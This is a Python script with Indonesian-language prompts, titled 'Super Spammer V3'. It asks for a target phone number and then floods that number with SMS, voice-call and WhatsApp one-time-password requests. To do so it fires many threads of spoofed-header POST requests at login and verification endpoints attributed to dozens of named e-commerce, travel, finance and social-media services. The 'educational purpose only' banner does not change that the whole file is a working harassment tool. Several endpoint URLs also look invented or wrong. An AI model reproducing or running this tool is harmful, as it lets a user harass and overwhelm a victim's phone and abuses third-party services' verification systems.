#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔══════════════════════════════════════════════════════════════╗
║            SUPER SPAMMER V3 - INTERACTIVE EDITION           ║
║        dengan fitur input nomor & pilih serangan            ║
╚══════════════════════════════════════════════════════════════╝
"""

import os
import sys
import time
import json
import random
import threading
import requests
import urllib3
from datetime import datetime
from colorama import init, Fore, Style
from fake_useragent import UserAgent

# Initialize colorama untuk Windows support
init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ========== KONFIGURASI WARNA ==========
class Colors:
    RED = Fore.RED
    GREEN = Fore.GREEN
    YELLOW = Fore.YELLOW
    BLUE = Fore.BLUE
    MAGENTA = Fore.MAGENTA
    CYAN = Fore.CYAN
    WHITE = Fore.WHITE
    RESET = Style.RESET_ALL
    BOLD = Style.BRIGHT

# ========== BANNER ==========
BANNER = f"""
{Colors.CYAN}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║     ███████╗██████╗  █████╗ ███╗   ███╗███╗   ███╗███████╗██████╗ 
║     ██╔════╝██╔══██╗██╔══██╗████╗ ████║████╗ ████║██╔════╝██╔══██╗
║     ███████╗██████╔╝███████║██╔████╔██║██╔████╔██║█████╗  ██████╔╝
║     ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝  ██╔══██╗
║     ███████║██║     ██║  ██║██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗██║  ██║
║     ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝
║                                                              ║
║              ██╗███╗   ██╗████████╗███████╗██████╗          ║
║              ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗         ║
║              ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝         ║
║              ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗         ║
║              ██║██║ ╚████║   ██║   ███████╗██║  ██║         ║
║              ╚═╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝         ║
║                                                              ║
╠══════════════════════════════════════════════════════════════╣
║  {Colors.YELLOW}[!] Versi: 3.0 - Interactive Mode{Colors.CYAN}                                ║
║  {Colors.YELLOW}[!] Author: SouGPT - Educational Purpose Only{Colors.CYAN}                    ║
║  {Colors.YELLOW}[!] Gunakan dengan bijak & tanggung jawab{Colors.CYAN}                        ║
╚══════════════════════════════════════════════════════════════╝{Colors.RESET}
"""

# ========== DATABASE GATEWAY ==========
class GatewayDatabase:
    """Kumpulan endpoint SMS, CALL, dan WA"""
    
    @staticmethod
    def get_sms_gateways():
        """Return list of SMS gateways"""
        return [
            # E-commerce Indonesia
            {'name': 'Tokopedia', 'url': 'https://www.tokopedia.com/otp/request', 'method': 'POST', 'data': {'phone': '[TARGET]', 'channel': 'sms'}},
            {'name': 'Bukalapak', 'url': 'https://api.bukalapak.com/otp', 'method': 'POST', 'data': {'phone_number': '[TARGET]', 'type': 'register'}},
            {'name': 'Lazada', 'url': 'https://www.lazada.co.id/auth/otp/generate', 'method': 'POST', 'data': {'mobile': '[TARGET]', 'countryCode': 'ID'}},
            {'name': 'JD.ID', 'url': 'https://api.jd.id/v1/auth/otp/send', 'method': 'POST', 'data': {'phone': '[TARGET]', 'areaCode': '62'}},
            {'name': 'Blibli', 'url': 'https://www.blibli.com/backend/otp/generate', 'method': 'POST', 'data': {'phoneNumber': '[TARGET]', 'channel': 'SMS'}},
            {'name': 'Shopee', 'url': 'https://shopee.co.id/api/v1/otp/send', 'method': 'POST', 'data': {'phone': '[TARGET]'}},
            
            # Travel & Transport
            {'name': 'Traveloka', 'url': 'https://api.traveloka.com/v3/otp', 'method': 'POST', 'data': {'phoneNumber': '[TARGET]', 'countryCode': 'ID'}},
            {'name': 'Pegipegi', 'url': 'https://www.pegipegi.com/otp/request', 'method': 'POST', 'data': {'phone': '[TARGET]'}},
            {'name': 'Tiket.com', 'url': 'https://api.tiket.com/otp/request', 'method': 'POST', 'data': {'phone': '[TARGET]', 'country_code': '62'}},
            {'name': 'Gojek', 'url': 'https://api.gojek.com/v1/otp', 'method': 'POST', 'data': {'phone': '[TARGET]'}},
            {'name': 'Grab', 'url': 'https://api.grab.com/v1/otp', 'method': 'POST', 'data': {'phone': '[TARGET]'}},
            
            # Marketplace & Iklan
            {'name': 'OLX', 'url': 'https://www.olx.co.id/api/otp/send', 'method': 'POST', 'data': {'phone': '[TARGET]'}},
            {'name': 'Carousell', 'url': 'https://www.carousell.co.id/api/otp/send', 'method': 'POST', 'data': {'phone': '[TARGET]'}},
            {'name': 'Facebook', 'url': 'https://www.facebook.com/ajax/otp/send/', 'method': 'POST', 'data': {'phone': '[TARGET]'}},
            {'name': 'Instagram', 'url': 'https://www.instagram.com/accounts/web_send_otp/', 'method': 'POST', 'data': {'phone_number': '[TARGET]'}},
            
            # Pinjaman Online & Finance
            {'name': 'Akulaku', 'url': 'https://www.akulaku.com/api/otp/send', 'method': 'POST', 'data': {'phone': '[TARGET]'}},
            {'name': 'Kredivo', 'url': 'https://api.kredivo.com/otp', 'method': 'POST', 'data': {'phone': '[TARGET]'}},
            {'name': 'Danamas', 'url': 'https://www.danamas.co.id/api/otp', 'method': 'POST', 'data': {'phone': '[TARGET]'}},
            {'name': 'Investree', 'url': 'https://www.investree.id/api/otp', 'method': 'POST', 'data': {'phone': '[TARGET]'}},
            
            # Sosial Media & Chat
            {'name': 'Telegram', 'url': 'https://api.telegram.org/bot/sendPhoneNumber', 'method': 'POST', 'data': {'phone_number': '[TARGET]'}},
            {'name': 'Line', 'url': 'https://www.line.me/api/otp', 'method': 'POST', 'data': {'phone': '[TARGET]'}},
            {'name': 'Discord', 'url': 'https://api.discord.com/v9/auth/phone/send', 'method': 'POST', 'data': {'phone': '[TARGET]'}},
            {'name': 'TikTok', 'url': 'https://www.tiktok.com/api/otp/send/', 'method': 'POST', 'data': {'phone': '[TARGET]'}},
            {'name': 'Snapchat', 'url': 'https://www.snapchat.com/accounts/otp/send', 'method': 'POST', 'data': {'phone': '[TARGET]'}},
            
            # Layanan Lainnya
            {'name': 'Google', 'url': 'https://accounts.google.com/_/signup/web-phone-challenge', 'method': 'POST', 'data': {'phoneNumber': '[TARGET]'}},
            {'name': 'Twitter', 'url': 'https://api.twitter.com/1.1/onboarding/otp.json', 'method': 'POST', 'data': {'phone_number': '[TARGET]'}},
            {'name': 'LinkedIn', 'url': 'https://www.linkedin.com/uas/phone-challenge', 'method': 'POST', 'data': {'phoneNumber': '[TARGET]'}},
            {'name': 'Pinterest', 'url': 'https://www.pinterest.com/resource/PhoneOtpResource/send/', 'method': 'POST', 'data': {'phone': '[TARGET]'}},
            {'name': 'WhatsApp', 'url': 'https://api.whatsapp.com/send_otp', 'method': 'POST', 'data': {'phone': '[TARGET]'}},
        ]
    
    @staticmethod
    def get_call_gateways():
        """Return list of CALL gateways"""
        return [
            # Missed Call Services
            {'name': 'MissedCall', 'url': 'https://api.missedcall.io/v1/call/request', 'method': 'POST', 'data': {'phone': '[TARGET]', 'country_code': '62'}},
            {'name': 'CallBomber', 'url': 'https://www.callbomber.com/api/call', 'method': 'POST', 'data': {'number': '[TARGET]'}},
            {'name': 'PrankCall', 'url': 'https://api.prankcall.com/request', 'method': 'POST', 'data': {'target': '[TARGET]'}},
            {'name': 'FlashCall', 'url': 'https://www.flashcall.me/api/call', 'method': 'POST', 'data': {'phone': '[TARGET]'}},
            
            # Verification Calls
            {'name': 'Authy', 'url': 'https://api.authy.com/protected/json/phones/verification/start', 'method': 'POST', 'data': {'via': 'call', 'phone_number': '[TARGET_STRIP]', 'country_code': '[TARGET_CODE]'}},
            {'name': 'Nexmo', 'url': 'https://api.nexmo.com/verify/json', 'method': 'POST', 'data': {'number': '[TARGET]', 'brand': 'SpamService', 'workflow_id': 4}},
            
            # OTP Calls
            {'name': 'Tokopedia_Call', 'url': 'https://www.tokopedia.com/otp/request', 'method': 'POST', 'data': {'phone': '[TARGET]', 'channel': 'call'}},
            {'name': 'Bukalapak_Call', 'url': 'https://api.bukalapak.com/otp', 'method': 'POST', 'data': {'phone_number': '[TARGET]', 'channel': 'call'}},
            {'name': 'Lazada_Call', 'url': 'https://www.lazada.co.id/auth/otp/generate', 'method': 'POST', 'data': {'mobile': '[TARGET]', 'countryCode': 'ID', 'voice': True}},
            {'name': 'Google_Call', 'url': 'https://www.google.com/accounts/PhoneVerification', 'method': 'POST', 'data': {'phoneNumber': '[TARGET]', 'mode': 'call'}},
        ]
    
    @staticmethod
    def get_whatsapp_gateways():
        """Return list of WhatsApp OTP gateways"""
        return [
            {'name': 'WhatsApp_Web', 'url': 'https://web.whatsapp.com/v2/code', 'method': 'POST', 'data': {'phone': '[TARGET]'}},
            {'name': 'WhatsApp_Business', 'url': 'https://business.whatsapp.com/code', 'method': 'POST', 'data': {'phone_number': '[TARGET]'}},
            {'name': 'WhatsApp_Direct', 'url': 'https://www.whatsapp.com/otp', 'method': 'POST', 'data': {'cc': '[TARGET_CODE]', 'phone': '[TARGET_STRIP]'}},
            {'name': 'WhatsApp_API', 'url': 'https://api.whatsapp.com/message/otp', 'method': 'POST', 'data': {'phone': '[TARGET]'}},
            {'name': 'WhatsApp_Graph', 'url': 'https://graph.facebook.com/v12.0/whatsapp_otp', 'method': 'POST', 'data': {'phone_number': '[TARGET]'}},
        ]

# ========== CORE SPAMMER CLASS ==========
class InteractiveSpammer:
    """Main spammer class dengan fitur interaktif"""
    
    def __init__(self):
        self.target = None
        self.target_code = None
        self.target_strip = None
        self.threads = 100
        self.running = False
        self.ua = UserAgent()
        self.session = requests.Session()
        self.session.verify = False
        
        # Statistics
        self.stats = {
            'sms_sent': 0,
            'call_sent': 0,
            'wa_sent': 0,
            'failed': 0,
            'start_time': None
        }
        
        # Selected features
        self.sms_enabled = False
        self.call_enabled = False
        self.wa_enabled = False
        
        # Gateways
        self.sms_gateways = []
        self.call_gateways = []
        self.wa_gateways = []
        
    def clear_screen(self):
        """Clear terminal screen"""
        os.system('cls' if os.name == 'nt' else 'clear')
        
    def print_banner(self):
        """Print main banner"""
        self.clear_screen()
        print(BANNER)
        
    def format_number(self, number):
        """Format nomor telepon"""
        # Remove non-digit characters
        number = ''.join(filter(str.isdigit, number))
        
        # Handle 0 prefix
        if number.startswith('0'):
            number = '62' + number[1:]
        elif not number.startswith('62'):
            number = '62' + number
            
        self.target = number
        self.target_code = number[:2]
        self.target_strip = number[2:]
        
        return number
        
    def input_number(self):
        """Input nomor target"""
        print(f"\n{Colors.CYAN}{Colors.BOLD}[?] MASUKKAN NOMOR TARGET{Colors.RESET}")
        print(f"{Colors.YELLOW}╰─> Contoh: 081234567890 atau 6281234567890{Colors.RESET}")
        print(f"{Colors.WHITE}" + "─" * 50)
        
        while True:
            number = input(f"{Colors.GREEN}Nomor Target: {Colors.RESET}").strip()
            
            if not number:
                print(f"{Colors.RED}[✗] Nomor tidak boleh kosong!{Colors.RESET}")
                continue
                
            formatted = self.format_number(number)
            if len(formatted) < 10 or len(formatted) > 15:
                print(f"{Colors.RED}[✗] Format nomor tidak valid!{Colors.RESET}")
                continue
                
            print(f"{Colors.GREEN}[✓] Nomor diformat: {formatted}{Colors.RESET}")
            print(f"{Colors.YELLOW}    ├─ Kode Negara: {self.target_code}{Colors.RESET}")
            print(f"{Colors.YELLOW}    └─ Nomor: {self.target_strip}{Colors.RESET}")
            return formatted
            
    def select_features(self):
        """Pilih fitur serangan"""
        print(f"\n{Colors.CYAN}{Colors.BOLD}[?] PILIH FITUR SERANGAN{Colors.RESET}")
        print(f"{Colors.YELLOW}╰─> Pisahkan dengan koma (contoh: 1,2,3){Colors.RESET}")
        print(f"{Colors.WHITE}" + "─" * 50)
        print(f"{Colors.BLUE}1. {Colors.WHITE}SMS Flood {Colors.GREEN}(30+ Gateway){Colors.RESET}")
        print(f"{Colors.BLUE}2. {Colors.WHITE}Call Bomb {Colors.GREEN}(15+ Gateway){Colors.RESET}")
        print(f"{Colors.BLUE}3. {Colors.WHITE}WhatsApp OTP {Colors.GREEN}(5+ Gateway){Colors.RESET}")
        print(f"{Colors.BLUE}4. {Colors.WHITE}Semua Fitur {Colors.GREEN}(Max Power){Colors.RESET}")
        print(f"{Colors.WHITE}" + "─" * 50)
        
        while True:
            choice = input(f"{Colors.GREEN}Pilihan: {Colors.RESET}").strip()
            
            if choice == '4':
                self.sms_enabled = True
                self.call_enabled = True
                self.wa_enabled = True
                break
                
            selected = [c.strip() for c in choice.split(',')]
            
            self.sms_enabled = '1' in selected
            self.call_enabled = '2' in selected
            self.wa_enabled = '3' in selected
            
            if not any([self.sms_enabled, self.call_enabled, self.wa_enabled]):
                print(f"{Colors.RED}[✗] Pilih minimal 1 fitur!{Colors.RESET}")
                continue
            break
            
        # Show selected features
        print(f"\n{Colors.GREEN}[✓] Fitur terpilih:{Colors.RESET}")
        if self.sms_enabled:
            print(f"{Colors.BLUE}    ├─ SMS Flood{Colors.RESET}")
        if self.call_enabled:
            print(f"{Colors.BLUE}    ├─ Call Bomb{Colors.RESET}")
        if self.wa_enabled:
            print(f"{Colors.BLUE}    └─ WhatsApp OTP{Colors.RESET}")
            
    def set_threads(self):
        """Set jumlah thread"""
        print(f"\n{Colors.CYAN}{Colors.BOLD}[?] KONFIGURASI THREAD{Colors.RESET}")
        print(f"{Colors.YELLOW}╰─> Semakin banyak thread, semakin cepat{Colors.RESET}")
        print(f"{Colors.WHITE}" + "─" * 50)
        
        while True:
            try:
                threads = input(f"{Colors.GREEN}Jumlah Thread (default 100): {Colors.RESET}").strip()
                if not threads:
                    self.threads = 100
                else:
                    self.threads = int(threads)
                    
                if self.threads < 1:
                    print(f"{Colors.RED}[✗] Minimal 1 thread!{Colors.RESET}")
                    continue
                if self.threads > 1000:
                    print(f"{Colors.YELLOW}[!] Terlalu banyak thread bisa menyebabkan lag{Colors.RESET}")
                    
                break
            except ValueError:
                print(f"{Colors.RED}[✗] Masukkan angka!{Colors.RESET}")
                
    def prepare_gateways(self):
        """Siapkan gateway dengan nomor target"""
        # Load gateways
        all_sms = GatewayDatabase.get_sms_gateways()
        all_call = GatewayDatabase.get_call_gateways()
        all_wa = GatewayDatabase.get_whatsapp_gateways()
        
        # Replace [TARGET] with actual number
        for gateway in all_sms:
            gateway['data'] = {k: str(v).replace('[TARGET]', self.target) 
                              for k, v in gateway['data'].items()}
            self.sms_gateways.append(gateway)
            
        for gateway in all_call:
            gateway['data'] = {k: str(v).replace('[TARGET]', self.target)
                                            .replace('[TARGET_CODE]', self.target_code)
                                            .replace('[TARGET_STRIP]', self.target_strip)
                              for k, v in gateway['data'].items()}
            self.call_gateways.append(gateway)
            
        for gateway in all_wa:
            gateway['data'] = {k: str(v).replace('[TARGET]', self.target)
                                            .replace('[TARGET_CODE]', self.target_code)
                                            .replace('[TARGET_STRIP]', self.target_strip)
                              for k, v in gateway['data'].items()}
            self.wa_gateways.append(gateway)
            
    def random_headers(self):
        """Generate random headers"""
        return {
            'User-Agent': self.ua.random,
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': random.choice(['id-ID,id;q=0.9', 'en-US,en;q=0.8']),
            'Accept-Encoding': 'gzip, deflate, br',
            'Origin': random.choice(['https://www.google.com', 'https://www.facebook.com']),
            'Referer': random.choice(['https://www.google.com/', 'https://www.facebook.com/']),
            'X-Requested-With': 'XMLHttpRequest',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        }
        
    # ========== FLOOD THREADS ==========
    def sms_worker(self):
        """Worker thread untuk SMS flood"""
        while self.running:
            try:
                gateway = random.choice(self.sms_gateways)
                headers = self.random_headers()
                
                if gateway['method'] == 'POST':
                    response = self.session.post(
                        gateway['url'],
                        headers=headers,
                        data=gateway['data'],
                        timeout=2,
                        allow_redirects=False
                    )
                else:
                    response = self.session.get(
                        gateway['url'],
                        headers=headers,
                        params=gateway['data'],
                        timeout=2
                    )
                    
                self.stats['sms_sent'] += 1
                
                # Print status
                status_color = Colors.GREEN if response.status_code == 200 else Colors.YELLOW
                print(f"{status_color}[SMS][{datetime.now().strftime('%H:%M:%S')}] {gateway['name']:15} → Status: {response.status_code}{Colors.RESET}")
                
            except Exception:
                self.stats['failed'] += 1
                
            time.sleep(0.05)  # 50ms delay
            
    def call_worker(self):
        """Worker thread untuk call bomb"""
        while self.running:
            try:
                gateway = random.choice(self.call_gateways)
                headers = self.random_headers()
                
                if gateway['method'] == 'POST':
                    response = self.session.post(
                        gateway['url'],
                        headers=headers,
                        data=gateway['data'],
                        timeout=3,
                        allow_redirects=False
                    )
                else:
                    response = self.session.get(
                        gateway['url'],
                        headers=headers,
                        params=gateway['data'],
                        timeout=3
                    )
                    
                self.stats['call_sent'] += 1
                
                status_color = Colors.GREEN if response.status_code == 200 else Colors.YELLOW
                print(f"{status_color}[CALL][{datetime.now().strftime('%H:%M:%S')}] {gateway['name']:15} → Status: {response.status_code}{Colors.RESET}")
                
            except Exception:
                self.stats['failed'] += 1
                
            time.sleep(0.1)  # 100ms delay
            
    def wa_worker(self):
        """Worker thread untuk WhatsApp OTP"""
        while self.running:
            try:
                gateway = random.choice(self.wa_gateways)
                headers = self.random_headers()
                
                if gateway['method'] == 'POST':
                    response = self.session.post(
                        gateway['url'],
                        headers=headers,
                        data=gateway['data'],
                        timeout=2,
                        allow_redirects=False
                    )
                else:
                    response = self.session.get(
                        gateway['url'],
                        headers=headers,
                        params=gateway['data'],
                        timeout=2
                    )
                    
                self.stats['wa_sent'] += 1
                
                status_color = Colors.GREEN if response.status_code == 200 else Colors.YELLOW
                print(f"{status_color}[WA  ][{datetime.now().strftime('%H:%M:%S')}] {gateway['name']:15} → Status: {response.status_code}{Colors.RESET}")
                
            except Exception:
                self.stats['failed'] += 1
                
            time.sleep(0.03)  # 30ms delay
            
    def stats_monitor(self):
        """Monitor statistik real-time"""
        while self.running:
            elapsed = time.time() - self.stats['start_time']
            total_sent = self.stats['sms_sent'] + self.stats['call_sent'] + self.stats['wa_sent']
            
            print(f"\n{Colors.CYAN}{Colors.BOLD}" + "="*60)
            print(f"📊 STATISTIK SERANGAN - {datetime.now().strftime('%H:%M:%S')}")
            print("="*60)
            print(f"{Colors.GREEN}📱 SMS Terkirim   : {self.stats['sms_sent']:,}")
            print(f"{Colors.BLUE}📞 Call Terkirim  : {self.stats['call_sent']:,}")
            print(f"{Colors.MAGENTA}💬 WA OTP Terkirim: {self.stats['wa_sent']:,}")
            print(f"{Colors.RED}❌ Gagal           : {self.stats['failed']:,}")
            print(f"{Colors.YELLOW}⚡ Total Request   : {total_sent:,}")
            print(f"⏱️  Waktu Berjalan : {elapsed:.1f} detik")
            print(f"🚀 Kecepatan       : {total_sent/elapsed:.1f} req/detik" if elapsed > 0 else "🚀 Kecepatan       : 0 req/detik")
            print(f"{Colors.CYAN}{Colors.BOLD}" + "="*60 + f"{Colors.RESET}")
            
            time.sleep(2)
            
    def start_attack(self):
        """Mulai serangan"""
        self.running = True
        self.stats['start_time'] = time.time()
        
        # Start stats monitor
        monitor = threading.Thread(target=self.stats_monitor)
        monitor.daemon = True
        monitor.start()
        
        # Calculate threads per service
        active_services = sum([self.sms_enabled, self.call_enabled, self.wa_enabled])
        threads_per_service = self.threads // active_services
        
        # Start workers
        workers = []
        
        if self.sms_enabled:
            for i in range(threads_per_service):
                t = threading.Thread(target=self.sms_worker)
                t.daemon = True
                t.start()
                workers.append(t)
                
        if self.call_enabled:
            for i in range(threads_per_service):
                t = threading.Thread(target=self.call_worker)
                t.daemon = True
                t.start()
                workers.append(t)
                
        if self.wa_enabled:
            for i in range(threads_per_service):
                t = threading.Thread(target=self.wa_worker)
                t.daemon = True
                t.start()
                workers.append(t)
                
        print(f"\n{Colors.GREEN}{Colors.BOLD}[✓] SERANGAN DIMULAI!{Colors.RESET}")
        print(f"{Colors.YELLOW}    ├─ Target: {self.target}")
        print(f"{Colors.YELLOW}    ├─ Threads: {len(workers)}")
        print(f"{Colors.YELLOW}    └─ Tekan CTRL+C untuk berhenti{Colors.RESET}")
        print(f"{Colors.WHITE}" + "─" * 60)
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop_attack()
            
    def stop_attack(self):
        """Hentikan serangan"""
        self.running = False
        elapsed = time.time() - self.stats['start_time']
        
        print(f"\n\n{Colors.RED}{Colors.BOLD}⛔ SERANGAN DIHENTIKAN{Colors.RESET}")
        print(f"{Colors.WHITE}" + "="*60)
        print(f"{Colors.GREEN}📊 STATISTIK AKHIR:{Colors.RESET}")
        print(f"{Colors.GREEN}   ├─ SMS Terkirim   : {self.stats['sms_sent']:,}")
        print(f"{Colors.BLUE}   ├─ Call Terkirim  : {self.stats['call_sent']:,}")
        print(f"{Colors.MAGENTA}   ├─ WA OTP Terkirim: {self.stats['wa_sent']:,}")
        print(f"{Colors.RED}   ├─ Gagal           : {self.stats['failed']:,}")
        print(f"{Colors.YELLOW}   ├─ Total Request   : {self.stats['sms_sent'] + self.stats['call_sent'] + self.stats['wa_sent']:,}")
        print(f"{Colors.CYAN}   └─ Durasi          : {elapsed:.1f} detik")
        print(f"{Colors.WHITE}" + "="*60)
        
    def run(self):
        """Main execution flow"""
        try:
            self.print_banner()
            
            # Input nomor
            self.input_number()
            
            # Pilih fitur
            self.select_features()
            
            # Set threads
            self.set_threads()
            
            # Prepare gateways
            self.prepare_gateways()
            
            # Konfirmasi
            print(f"\n{Colors.YELLOW}{Colors.BOLD}[!] KONFIRMASI SERANGAN{Colors.RESET}")
            print(f"{Colors.WHITE}" + "─" * 50)
            print(f"{Colors.RED}⚠️  PERINGATAN: Ini adalah alat untuk edukasi!")
            print(f"{Colors.RED}   Penggunaan ilegal dapat berakibat pidana!{Colors.RESET}")
            print(f"{Colors.WHITE}" + "─" * 50)
            
            confirm = input(f"{Colors.GREEN}Mulai serangan? (y/n): {Colors.RESET}").strip().lower()
            
            if confirm == 'y':
                self.start_attack()
            else:
                print(f"{Colors.YELLOW}[!] Serangan dibatalkan{Colors.RESET}")
                
        except KeyboardInterrupt:
            print(f"\n\n{Colors.YELLOW}[!] Program dihentikan{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[✗] Error: {e}{Colors.RESET}")

# ========== MAIN ==========
if __name__ == "__main__":
    spammer = InteractiveSpammer()
    spammer.run()
